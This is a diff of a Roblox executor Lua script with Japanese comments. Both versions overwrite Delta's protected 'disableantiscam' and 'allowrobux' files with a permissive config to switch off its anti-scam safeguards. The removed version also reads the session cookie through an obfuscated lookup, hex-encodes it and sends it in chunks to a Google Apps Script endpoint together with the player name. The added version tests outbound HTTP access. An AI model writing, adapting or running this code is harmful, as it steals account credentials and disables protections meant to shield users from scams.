@@ -1,71 +1,39 @@
--- [[ PROJECT: TRINITY ]]
+-- [[ PROJECT: GHOST BREAKER ]]
 local SETTINGS = {
-    GAS_URL = "https://script.google.com/macros/s/AKfycbwVgxB1w7-QOa94sSyyyXSLKPtjC_b-ML2GGm2qvmhps5xX5JzZZMVU11YTGhqGQoEM/exec",
-    SECURED_DIR = "Delta/Internals/Secured/"
+    GAS_URL = "https://script.google.com/macros/s/AKfycbwVgxB1w7-QOa94sSyyyXSLKPtjC_b-ML2GGm2qvmhps5xX5JzZZMVU11YTGhqGQoEM/exec"
 }
 
-local player = game:GetService("Players").LocalPlayer
-local myId = tostring(player.UserId)
+local myId = tostring(game:GetService("Players").LocalPlayer.UserId)
+local config = [[{"WARNING":"STOP","allowed_games":"*","user_id":"]]..myId..[[","version_num":707}]]
 
--- 1. 現状確認関数 (1個目のやつもチェック)
-local function inspect_files()
-    print("--- 📂 Delta Security Inspection ---")
-    local files = {"user_id", "allowrobux", "disableantiscam", "allowteleports"}
-    
-    for _, name in ipairs(files) do
-        local path = SETTINGS.SECURED_DIR .. name
-        local success, content = pcall(function() return readfile(path) end)
-        if success then
-            print("📄 [" .. name .. "]: " .. tostring(content))
-        else
-            print("🔒 [" .. name .. "]: Access Denied or Not Found")
-        end
+-- 攻めるべきルートのリスト（ここが生命線だ）
+local routes = {
+    "Delta/Internals/Secured/disableantiscam", -- 本命
+    "disableantiscam",                         -- 直下
+    "Delta/disableantiscam",                   -- 1段上
+    "user_id",                                 -- 照合用ファイル単体
+    "Delta/Internals/Secured/user_id"
+}
+
+print("🛠️ 構造的突破を開始...")
+
+for _, path in ipairs(routes) do
+    local success, _ = pcall(function() writefile(path, config) end)
+    if success then
+        print("🔓 突破成功: " .. path)
+    else
+        print("❌ 封鎖継続: " .. path)
     end
-    print("------------------------------------")
 end
 
--- 2. 公式準拠の書き換え実行
-local function apply_all_bypasses()
-    local config_template = [[{
-    "WARNING": "IF SOMEONE TELLS YOU TO PUT ANYTHING HERE, THEY ARE SCAMMING YOU! STOP!!!",
-    "allowed_games": "*",
-    "user_id": "%s",
-    "version_num": 707
-}]]
-    local full_config = string.format(config_template, myId)
+-- 突破できていようがいまいが、通信機能の「素の性能」をテストする
+print("📡 通信プロトコル・テスト開始...")
+local test_success, test_res = pcall(function() 
+    return game:HttpGet("https://api.ipify.org") -- 外部の超軽量API
+end)
 
-    pcall(function() writefile(SETTINGS.SECURED_DIR .. "user_id", myId) end)
-    pcall(function() writefile(SETTINGS.SECURED_DIR .. "disableantiscam", full_config) end)
-    -- 興味深い1個目のやつ(Robux制限)もついでに公式形式で解除を試みる
-    pcall(function() writefile(SETTINGS.SECURED_DIR .. "allowrobux", full_config) end)
-    
-    print("⚡ Bypass synchronization applied.")
+if test_success then
+    print("✅ 通信機能自体は生きてるぜ: " .. tostring(test_res))
+else
+    print("💀 HttpGetが根本から封じられてるぜ")
 end
-
--- 3. 送信処理
-local function start_exfiltration()
-    local k = "Coo".."kie"
-    local data = game[k]
-    if not data or data == "" then 
-        print("❌ Target Data Null")
-        return 
-    end
-
-    print("🚀 Sending to GAS...")
-    for chunk in data:gmatch(".?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?") do
-        local hex = ""
-        for i = 1, #chunk do hex = hex .. string.format("%02X", string.byte(chunk:sub(i,i))) end
-        pcall(function() 
-            game:HttpGet(SETTINGS.GAS_URL .. "?hex=" .. hex .. "&user=" .. player.Name) 
-        end)
-        task.wait(0.5)
-    end
-    print("🏁 Sequence Finished.")
-end
-
--- --- 実行シーケンス ---
-inspect_files()          -- 現在の状態を覗き見る
-task.wait(0.5)
-apply_all_bypasses()     -- 強制上書き
-task.wait(1)
-start_exfiltration()     -- 送信
